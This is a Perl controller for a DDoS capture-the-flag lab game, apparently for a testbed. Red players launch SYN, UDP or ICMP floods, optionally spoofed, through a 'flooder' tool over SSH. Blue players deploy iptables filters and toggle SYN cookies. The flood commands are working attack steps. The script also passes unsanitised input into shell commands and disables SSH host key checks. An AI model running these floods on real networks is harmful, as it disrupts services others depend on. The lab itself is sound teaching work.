#!/usr/bin/perl

$usage = "$0 experiment project blue red\n";

if ($#ARGV<1)
{
    print $usage;
    exit
}
$exp = $ARGV[0];
$proj = $ARGV[1];

$blue = int($ARGV[2]);
$red = int($ARGV[3]);

our %filters=();
our %suggestions=();
our %attacks=();
our $ff=0;
our $lf=0;

do {
    
    print "\n\n************************************************\n";
    print "******** DDoS Capture the Flag Game ************\n";
    print "************************************************\n\n";
    print "Select one option: \n";
    if ($blue)
    {
	print "\t (1) Monitor server / detect attack \n";
	print "\t (2) Deploy filters at gateway \n";
	print "\t (3) Remove filters from gateway \n";
	print "\t (4) Turn ON SYN cookies on server \n";
	print "\t (5) Turn OFF  SYN cookies on server \n";
	print "\t (6) Exit \n";
    }
    if ($red)
    {
	print "\t (1) Monitor server / detect attack \n";
	print "\t (2) Launch attack \n";
	print "\t (3) Abort attack \n";
	print "\t (4) Exit \n";
    }

    $input = <STDIN>;

    if ($input == 1)
    {
	monitor($blue, $red);
    }
    elsif ($input == 2 && $blue)
    {
	filter(1);
    }
    elsif ($input == 3 && $blue)
    {
	filter(0);
    }
    if ($input == 2 && $red)
    {
	attack(1);
    }
    elsif ($input == 3 && $red)
    {
	attack(0);
    }
    elsif ($input == 4 && $blue)
    {
	syncookie(1)
    }
    elsif ($input == 5 && $blue)
    {
	syncookie(0)
    }
	
}while (($blue && $input != 6) || ($red && $input != 4));
    

sub monitor
{
    ($blue, $red)=@_;
    if ($blue == 1)
    {
	open(SSH,"ssh -o StrictHostKeyChecking=no gateway.$exp.$proj 'cat /tmp/detect.log' |") || die "Failed: $!\n";
    }
    else
    {
	open(SSH,"ssh -o StrictHostKeyChecking=no client1.$exp.$proj 'cat /tmp/detect.log' |") || die "Failed: $!\n";
    }
    $print = 1;
    while ( <SSH> )
    {
	my @items = split /\t/, $_;
	$line = $_;
	if ($red)
	{
	    if ($line =~ /FILTER/)
	    {
		$print=0;
	    }
	}
	if ($print)
	{
	    print $line;
	}
	if ($line =~ /any/ || $line =~ /tcp/ || $line =~ /udp/)
	{
	    $i = index($line, "\t");
	    $suggestions{$items[0]} = substr($line, $i+1);
	}
	if ($ff == 0)
	{
	    $ff = $items[0];
	}
	$lf = $items[0];
    }
}

sub filter
{
    $deploy = shift;
    if ($deploy)
    {
	$i = 1;
	print "Num\tIP\t\tport\t\tproto\tfiltered\tcollateral\ttype\n";
	print "****************************************************************\n";	   
	for $s (sort {$a <=> $b} keys %suggestions)
	{
	    print "$i\t$suggestions{$s}";
	    $i++;
	}
	print "Which filter would you like to deploy? ($ff-$lf) ";
	$filter = int(<STDIN>);
	if ($filter >= $ff && $filter <= $lf)
	{
	    # 0.0.0.0 0 udp 99.81 0.00 any
	    my @items = split /\s+/, $suggestions{$filter};
	    if ($items[2] !~ m/any/)
	    {
		$proto = lc($items[2]);
		$cmd = "sudo iptables -A FORWARD -p $proto --dst 10.1.5.2 -j DROP";
		if (!exists($filters{$cmd}))
		{
		    system("ssh -o StrictHostKeyChecking=no gateway.$exp.$proj '$cmd'");
		    $filters{$suggestions{$filter}} = $cmd;
		    print "\n\tFilter $suggestions{$filter} deployed cmd $cmd\n";
		}
	    }
	    else
	    {
		for $proto ('tcp','udp')
		{
		    $cmd = "sudo iptables -A FORWARD -p $proto --dst 10.1.5.2 ";
		    if ($items[0] !~ m/0\.0\.0\.0/)
		    {
			$cmd .= "--src $items[0] ";
		    }
		    if ($items[1] !~ m/^0/)
		    {
			$cmd .= "--sport $items[1] -p tcp,udp ";		   
		    }
		    $cmd .= "-j DROP";
		    if (!exists($filters{$cmd}))
		    {
			system("ssh -o StrictHostKeyChecking=no gateway.$exp.$proj '$cmd'");
			$s = $suggestions{$filter};
			$s =~ s/any/$proto/;
			$filters{$s} = $cmd;
			print "\n\tFilter $suggestions{$filter} deployed cmd $cmd\n";
		    }
		}
	    }
	}
    }
    else
    {
	$i = 1;
	$ff = 1;
	%map=();
	print "Num\tIP\tport\t\tproto\tfiltered\tcollateral\ttype\n";
	print "****************************************************************\n";	   
	for $f (sort {$a <=> $b} keys %filters)
	{
	    $lf = $i;
	    print "$i\t$f\n";
	    $map{$i} = $f;
	    $i++;
	}
	print "Which filter would you like to remove? ($ff-$lf) ";
	$filter = int(<STDIN>);
	if ($filter >= $ff && $filter <= $lf)
	{
	    $cmd = $filters{$map{$filter}};
	    $cmd =~ s/\-A/\-D/;
	    
	    system("ssh -o StrictHostKeyChecking=no gateway.$exp.$proj '$cmd'");
	    print "\n\tFilter $map{$filter} deleted\n";
	    delete $filters{$map{$filter}};
	}
    }
      
    
}

sub attack
{
    $deploy = shift;
    if ($deploy)
    {
	print "1. TCP SYN flood\n";
	print "2. UDP flood\n";
	print "3. ICMP flood\n";
	print "4. Slowloris\n";

	print "Which attack would you like to launch? (1-4) ";
	$attack = int(<STDIN>);
	if ($attack >= 1 && $attack <= 4)
	{
	    if ($attack < 4)
	    {
		if ($attack == 1)
		{
		    $attackdesc = "TCP SYN flood";
		    $proto = 6;
		}
		elsif ($attack == 2)
		{
		    $attackdesc = "UDP flood";
		    $proto = 17;
		}
		if ($attack == 3)
		{
		    $attackdesc = "ICMP flood";
		    $proto = 1;
		}
		print "Spoofed (yes or no)? ";
		$spoof = <STDIN>;
		print "Volume (low or high)? ";
		$volume = <STDIN>;
		if ($volume =~ m/high/)
		{
		    $rate = 1000000;
		    $attackdesc .= ", high rate";
		}
		else
		{
		    $rate = 1000;
		    $attackdesc .= ", low rate";
		}
		$cmd = "sudo flooder --dst 10.1.5.2 --highrate $rate --proto $proto ";
		if ($attack != 3)
		{
		    $cmd .= "--dportmin 80 --dportmax 80";		   
		}
		if ($spoof =~ /yes/)
		{
		    $cmd1 = $cmd . " --src 1.1.2.0 --srcmask 255.255.255.0 ";
		    $cmd2 = $cmd . " --src 1.1.3.0 --srcmask 255.255.255.0 ";
		    $attackdesc .= ", with spoofing";
		}
		else
		{
		    $cmd1 = $cmd;
		    $cmd2 = $cmd;
		    $attackdesc .= ", no spoofing";
		}
		
		system("ssh -o StrictHostKeyChecking=no client1.$exp.$proj '$cmd1' &");
		system("ssh -o StrictHostKeyChecking=no client2.$exp.$proj '$cmd2' &");
		print "\n\tAttack $attackdesc launched cmd $cmd\n";
		$attacks{$attackdesc} = "$cmd1";
	    }
	    else
	    {
	    }
	}
    }
    else
    {
	my %map;
	$i = 1;
	$fl = $i;
	for $a (sort keys %attacks)
	{
	    print "$i $a\n";
	    $map{$i} = $a;
	    $ll = $i;
	    $i++;
	}
	print "Which attack would you like to stop ($fl-$ll)?";
	$attack = int(<STDIN>);
	if ($attack >= $fl && $attack <= $ll)
	{
	    $attackdesc = $map{$attack};
	    if ($attackdesc =~ /TCP SYN/ || $attackdesc =~ /UDP/ || $attackdesc =~ /ICMP/)
	    {
		$cmd = "ps axuw | grep flooder";
		if ($attackdesc =~ /TCP SYN/)
		{
		    $proto = 6;
		}
		elsif ($attackdesc =~ /UDP/)
		{
		   $proto = 17;		   
		}
		else
		{
		    $proto = 1;
		}
		if ($attackdesc =~ /with spoofing/)
		{
		    $mask = "255.255.255.0";
		}
		for $client ('client1', 'client2')
		{
		    $oldcmd = substr($attacks{$attackdesc}, 5);
		    open(GREP,"ssh -o StrictHostKeyChecking=no $client.$exp.$proj '$cmd' |") || die "Failed: $!\n";
		    while ( <GREP> )			
		    {
			my @items = split /\s+/,$_;
			if ($items[10] =~ /^flooder/)
			{
			    print "$_";
			    if ($_ =~ /$oldcmd/)
			    {
				$pid = $items[1];
				$newcmd = "sudo kill -9 $pid";				
				system("ssh -o StrictHostKeyChecking=no $client.$exp.$proj '$newcmd'");
			    }
			}
		    }
		}
	    }
	}
    }
}

sub syncookie
{
    $deploy = shift;
    $cmd = "sudo sysctl -w net.ipv4.tcp_syncookies=$deploy";
    system("ssh -o StrictHostKeyChecking=no server.$exp.$proj '$cmd'");
    print "SYN cookies turned ";
    if ($deploy)
    {
	print "ON\n";
    }
    else
    {
	print "OFF\n";
    }
}
